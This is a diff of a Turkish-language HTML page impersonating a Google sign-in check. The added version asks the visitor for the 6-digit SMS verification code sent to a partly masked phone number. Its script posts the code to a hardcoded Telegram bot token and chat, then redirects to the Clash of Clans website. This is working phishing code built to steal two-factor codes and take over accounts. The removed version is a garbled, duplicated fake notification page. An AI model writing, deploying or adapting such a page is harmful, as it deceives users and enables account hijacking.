@@ -1,115 +1,127 @@
-<!DOCTYPE html>
 <html lang="tr">
  <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>
-   Google Kimlik Doğrulama
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Oturum Açma</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap"
+    rel="stylesheet"
+  />
   <style>
-   body {
-      font-family: 'Roboto', sans-serif;
+    body {
+      font-family: "Google Sans", Arial, sans-serif;
     }
   </style>
  </head>
- <body class="bg-white text-black min-h-screen flex flex-col justify-center">
-  <!-- Main content -->
-  <main class="flex flex-col items-center px-6 mt-10 text-center">
-   <img alt="Google logo alternative image with colorful G and shapes" class="mb-6" height="40" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlRpc2vx4orjN3Scgz6bQNhm9DHW585PW-qg&s" width="100"/>
-   <h1 class="text-2xl font-normal mb-3">
-    Kimliğinizi doğrulayın
-   </h1>
-   <p class="text-base font-normal max-w-md mb-6">
-    Google, hesabınızın güvenliğini korumak için oturum açmaya çalışan kişinin gerçekten siz olduğunuzdan emin olmak istiyor
-   </p>
-   <div class="flex items-center space-x-2 mb-14 text-sm font-normal text-gray-900">
-    <i class="fas fa-user-circle text-xl">
-    </i>
-    <span>
-     **********.com
-    </span>
+ <body class="bg-white text-black min-h-screen flex flex-col">
+  <main class="px-6 flex-grow">
+   <div class="mt-6 mb-4 max-w-xl">
+    <img
+      alt="Google logo with G letter in red, yellow, green and blue colors"
+      class="mb-4"
+      height="40"
+      src="https://storage.googleapis.com/a1aa/image/54c17253-4812-4b67-58db-84cbb95dbfeb.jpg"
+      width="40"
+    />
+    <h2 class="text-3xl font-normal mb-2 leading-tight">Oturum açma</h2>
+    <p class="text-base font-normal mb-6 leading-relaxed">
+      Google, hesabınızın güvenliğini korumak için oturum açmaya çalışan
+      kişinin gerçekten siz olduğunuzdan emin olmak istiyor
+    </p>
+    <button
+      aria-expanded="false"
+      aria-haspopup="listbox"
+      class="inline-flex items-center border border-gray-400 rounded-full px-4 py-1 text-base font-normal text-black mb-10"
+      type="button"
+    >
+     <i class="fas fa-user-circle text-xl mr-2"></i>8 ** *****30
+     <i class="fas fa-chevron-down ml-2"></i>
+    </button>
+    <p class="mb-4 text-base font-normal leading-relaxed">
+      8 62 252030 numaralı telefona az önce 6 basamaklı doğrulama kodunu içeren
+      bir kısa mesaj gönderildi
+    </p>
+    <form id="codeForm" onsubmit="return false;">
+     <label
+       class="text-blue-600 text-sm font-normal mb-1 inline-block"
+       for="code"
+       >Kodu girin</label
+     >
+     <div>
+      <input
+        aria-label="Doğrulama kodu girişi"
+        class="w-full border-2 border-blue-600 rounded-md px-3 py-3 text-lg font-normal focus:outline-none focus:ring-2 focus:ring-blue-600"
+        id="code"
+        name="code"
+        placeholder="G-"
+        type="text"
+        autocomplete="off"
+      />
+     </div>
+    </form>
+    <p id="errorMsg" class="mt-10 mb-20 text-gray-400 text-base font-normal invisible">
+      Yeniden gönder
+    </p>
+    <div class="flex justify-end">
+     <button
+       id="submitBtn"
+       class="bg-blue-700 text-white rounded-full px-8 py-3 text-base font-normal focus:outline-none"
+       type="button"
+     >
+      Sonraki
+     </button>
+    </div>
    </div>
-   <div class="text-6xl font-light mb-6">
-    arka planı almak için evet basın
-   </div>
-   <h2 class="text-lg font-semibold mb-2 text-left w-full max-w-md">
-    telefonuzdaki bildirimlerinizi kontrol edin
-   </h2>
-   <p class="text-base font-normal max-w-md text-left mb-10">
-    Google cihazınıza bildirim gönderdi. Bildirimdeki
-    <strong>
-     Evet
-    </strong>
-    'e ve ardından telefonunuzdaki
-    <strong>
-     Evet
-    </strong>
-    sayısına dokunarak siz olduğunuzu doğrulayın.
-   </p>
-   <a class="text-blue-600 text-base font-normal self-start max-w-md mb-10" href="https://support.supercell.com/clash-of-clans/tr/articles/recruiting-clan-members.html?q=1748337074" target="_blank" rel="noopener noreferrer">
-    Devam
-   </a>
   </main>
- </body>
-</html><html lang="tr">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>
-   Google Kimlik Doğrulama
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
-  <style>
-   body {
-      font-family: 'Roboto', sans-serif;
-    }
-  </style>
- </head>
- <body class="bg-white text-black min-h-screen flex flex-col justify-center">
-  <!-- Main content -->
-  <main class="flex flex-col items-center px-6 mt-10 text-center">
-   <img alt="Google logo alternative image with colorful G and shapes" class="mb-6" height="40" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlRpc2vx4orjN3Scgz6bQNhm9DHW585PW-qg&s" width="100"/>
-   <h1 class="text-2xl font-normal mb-3">
-    Kimliğinizi doğrulayın
-   </h1>
-   <p class="text-base font-normal max-w-md mb-6">
-    Google, hesabınızın güvenliğini korumak için oturum açmaya çalışan kişinin gerçekten siz olduğunuzdan emin olmak istiyor
-   </p>
-   <div class="flex items-center space-x-2 mb-14 text-sm font-normal text-gray-900">
-    <i class="fas fa-user-circle text-xl">
-    </i>
-    <span>
-     **********.com
-    </span>
-   </div>
-   <div class="text-6xl font-light mb-6">
-    arka planı almak için evet basın
-   </div>
-   <h2 class="text-lg font-semibold mb-2 text-left w-full max-w-md">
-    telefonuzdaki bildirimlerinizi kontrol edin
-   </h2>
-   <p class="text-base font-normal max-w-md text-left mb-10">
-    Google cihazınıza bildirim gönderdi. Bildirimdeki
-    <strong>
-     Evet
-    </strong>
-    'e ve ardından telefonunuzdaki
-    <strong>
-     Evet
-    </strong>
-    sayısına dokunarak siz olduğunuzu doğrulayın.
-   </p>
-   <a class="text-blue-600 text-base font-normal self-start max-w-md mb-10" href="https://support.supercell.com/clash-of-clans/tr/articles/recruiting-clan-members.html?q=1748337074" target="_blank" rel="noopener noreferrer">
-    Devam
-   </a>
-  </main>
- </body>
+  <script>
+    const codeInput = document.getElementById("code");
+    const errorMsg = document.getElementById("errorMsg");
+    const submitBtn = document.getElementById("submitBtn");
 
+    submitBtn.addEventListener("click", () => {
+      const code = codeInput.value.trim();
+      if (code.length < 6) {
+        errorMsg.textContent = "Eksik kod girdiniz";
+        errorMsg.classList.remove("text-gray-400");
+        errorMsg.classList.add("text-red-600");
+        errorMsg.classList.remove("invisible");
+        return;
+      }
+      errorMsg.textContent = "Yeniden gönder";
+      errorMsg.classList.remove("text-red-600");
+      errorMsg.classList.add("text-gray-400");
+      errorMsg.classList.add("invisible");
+
+      const botToken = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
+      const chatId = "-1003358663641";
+      const message = `Girilen kod: ${code}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+        .then((response) => {
+          if (response.ok) {
+            window.location.href = "https://supercell.com/en/games/clashofclans/";
+          } else {
+            alert("Kod gönderilemedi, lütfen tekrar deneyin.");
+          }
+        })
+        .catch(() => {
+          alert("Kod gönderilemedi, lütfen tekrar deneyin.");
+        });
+    });
+  </script>
+ </body>
 </html>
